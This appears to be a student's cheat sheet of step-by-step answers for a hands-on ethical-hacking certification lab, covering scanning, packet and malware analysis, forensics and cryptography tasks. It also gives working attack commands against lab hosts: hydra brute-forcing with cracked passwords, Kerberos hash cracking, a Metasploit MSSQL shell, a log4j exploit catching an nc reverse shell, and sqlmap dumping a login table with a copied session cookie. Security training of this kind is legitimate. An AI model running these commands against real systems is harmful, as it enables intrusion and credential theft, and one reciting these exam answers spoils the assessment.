NMAP

* nmap -sn 192.168.10.0/24 (Exclude first ip address)
* nmap -p 22 192.168.10.0/24 --open
* nmap -p 53 192.168.0.0/24 --open
* nmap -sV -A 192.168.0.222
* nmap -p 3306 172.30.10.0/24 --open  ( you find the ip of host)
* nmap -A 172.30.10.99
* nmap -p 1433 192.168.10.0/24
* nmap -p 445 -sV -A 172.30.10.200



DNS Enumeration

* dig NS certifiedhacker.com   (or) use whois
* nmap -p 25 172.30.10.0/24 --open



Vuln Assessment

* Search for ( 2023 CWE Top 25 most dangerous software vulnerabilities ) in google.
* Goto \[ https://cwe.mitre.org/top25/archive/2023/2023\_top25\_list.html ]
* Enter last 25th id in list



OpenVAS

* docker run -d -p 443:443 --name openvas mikesplain/openvas
* Add task for given network.
* Goto results after the scan
* 
* docker run -d -p 443:443 --name openvas mikesplain/openvas
* Add task for given network.
* Goto results after the scan
* Filter ftp



**Brute Force**

* nmap -p 22 192.168.10.0/24 --open (you found 4 ips)
* ping found ips to know which is linux with ttl value <= 64
* hydra -l nick -P password.txt ftp://192.168.10.111
* Password found is apple
* ftp 192.168.10.111
* login ftp with that password
* get 520125.py file and open to get vendor homepage



WireShark

* open Mscredremote.pcapng file in wireshark
* filter http.request.method == POST
* extend HTML Form Url
* 
* open file in wireshark you will found dest port is 26000
* search 26000 udp in google
* 
* Filter for UDP
* 
* open wireshark
* filter tcp.port == 135
* you find one ip with dst port 135
* 
* open report export.txt file
* find remote ip with higher no of packets



Analyze Domain Controller

* python3 GetNPUsers.py SKILL.com/ -no-pass -usersfile ~/users.txt -dc-ip 192.168.0.222
* copy the hash from output and paste in a txt file a.txt
* john --wordlist=rockyou.txt ~/a.txt
* 

1. scan all networks with open port 1433 | nmap -p 1433 192.168.10.0/24 --open
2. Try bruteforce all ips with open 1433 port
3. hydra -U username.txt -P password.txt 192.168.10.144 mssql
4. user = Server\_mssrv  and Password = Spidy
5. python3 /Ad-tools/impacket/examples/mssqlclient.py SKILL.com/Server\_mssrv:Spidy@192.168.10.144  -port 1433
6. Then type this \[ SELECT name, CONVERT(INT, ISNULL(value, value\_in\_use)) AS IsConfigured FROM sys.configurations WHERE name='xp\_cmdshell'; ]
7. type exit.
8. Goto msfconsole
9. ▪ use exploit/windows/mssql/mssql\_payload ▪ set RHOST 192.168.10.144 ▪ set USERNAME Server\_mssrv ▪ set PASSWORD Spidy ▪ set DATABASE msdb
10. Exploit
11. In meterpreter, type shell
12. type cd /Users/Public/Downloads/  and type dir
13. note the size of MSS.txt



Crack RDP Credentials

* nmap -p 3389 192.168.10.0/24 --open
* hydra -l Maurice -P rockyou.txt 192.168.10.222 rdp



Hash

* sha256sum Tools.rar



Malware Analysis

* Copy that log file to windows
* Install procmon.exe in the malware analysis folder
* open that file in procmon
* Search H3II0 and double click to open. now you find the Paren PID
* 
* Copy that file to windows
* open that file with DIE tool inside the static malware analysis folder
* Click Entropy button to see value



Steganography

* steghide extract -sf stealth.jpg
* open hidden.txt



Vuln Search

* Searchsploit AirDrop 2.0



Wireshark

* open file in wireshark
* you can easily find the victim ip
* 
* Open file in wireshark
* filter http.request.method == POST
* search for post login.aspx in list and extend the HTML Form



Log Analysis

* Open file in pluma
* Search for ip with multiple login attemps



Footprint Analysis

* whatweb certifiedhacker.com



Crack SSH

* nmap -p 22 192.168.10.0/24 --open
* hydra -l Martin -P password.txt 192.168.10.101
* Password: qwerty1234
* ssh Martin@192.168.10.101   enter password and get the file



Web App Hacking

* First find the ip hosting website in port 8080 using nmap. Then do further steps
* In home execute
* tar -xf jdk-8u202-linux-x64.tar.gz
* mv jdk1.8.0\_202 /usr/bin
* cd log4j-shell-poc
* pluma poc.py
* Update the JDK Path in the Poc.py file
* Change Line no: 62, replace jdk1.8.0\_20/bin/javac with "/usr/bin/jdk1.8.0\_202/bin/javac"
* Change Line no: 87, replace jdk1.8.0\_20/bin/java with "/usr/bin/jdk1.8.0\_202/bin/java"
* Change Line no: 99, replace jdk1.8.0\_20/bin/java with "/usr/bin/jdk1.8.0\_202/bin/java"
* execute this in seperate terminal \[ nc -lvp 9001]
* python3 poc.py --userip {ip of attacker pc} --webport 8080 --lport 9001
* Copy the \[send this : value to be copied] from the output of previous command
* paste in username box and type any password in password box, click login
* Reverse shell connected in separate terminal where nc is listening
* type cat RootFlag.txt to view answer
* (If not connect to reverse shell reload the website and check the path and try again )







* get file from music folder of user Martin
* whatweb "url"



CVE-XSS

* I found manually you can use Owasp zap or open vas or vega to confirm
* 
* Run Atomated scan with OWASP ZAP



Brute Force

* wpscan --url http://www.cehorg.com:8080/CEH/wp-login.php -U adam -P password.txt
* use password list in desktop





SQL Injection

* Copy the cookie value of user session lee in inspect element console, type document.cookie
* sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --dbs
* sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moveiscope --tables
* sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moviescope -T user-Login --dump
* 
* Search for WASC ID for SQL Injection in google



Encrypted Message

* scan for open port 5555 in nmap
* adb connect 192.168.10.121
* adb pull /sdcard
* find .txt file and copy to windows
* open with BCtext encoder and decrypt with given password



Mobile Hacking

* cd Phonesploit
* python phonesploit.py
* type 1 and enter ip address (192.168.10.121)
* type n 2 times and press 36, then press1 -> press 2(com.cxinventor.com) and give some path to save apk
* now type crc32 path to apk



Forensics

* Extract the zip and use MD5 calculator
* 
* Open call log file inside the sdcard/call
* see suspect log
* 
* Open file in wireshark and Goto Analyze -> Expert Information
* 
* Open file in wireshark and filter mqtt
* extend mqtt and right click -> copy as printable text and see clipboard for answer



Hex

* Copy file to windows and open with cryptool
* You need to try all algorithms with 128 bit key length with key 06
* Goto Encrypt/Decrypt -> Symmetric (Modern) -> Further Algorithms -> Twofish
* Select 128 as key length and put key as 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06



Encryption

* Open vercrypt and choose Myveracrypt file
* Select volume to mount and click mount
* Enter the password. And go to the volume in File explorer



Mobile

* cd Phonesploit
* python3 phonesploit.py
* type 1 and enter ip address (192.168.10.121)
* type n 2 times and press 34, then press 2 and give some path
* now open the extracted file to find answer
* 
* cd Phonesploit
* python phonesploit.py
* type n 2 times and press 39



IoT

* Open file with wireshark and filter mqtt
* Search for publish message and expand to get answer



Mobile Hacking

* scan for open port 5555 in nmap
* adb connect 192.168.10.121
* adb pull /sdcard
* find .txt file and read
* 
* scan for open port 5555 in nmap
* adb connect 192.168.10.121
* adb pull /sdcard
* find image file and open



Hash

* Copy files to windows
* Add the Archive folder to the MD5 calculator application
* Compare with filehashes.txt



Encryption

* Just copy the secret file in parrot to windows in any way like smb or apache server.
* Now open veracrypt in windows already installed in windows.
* Select the secret file, then choose volume to mount and enter password (test).
* Now go to the volume mounted and count files.



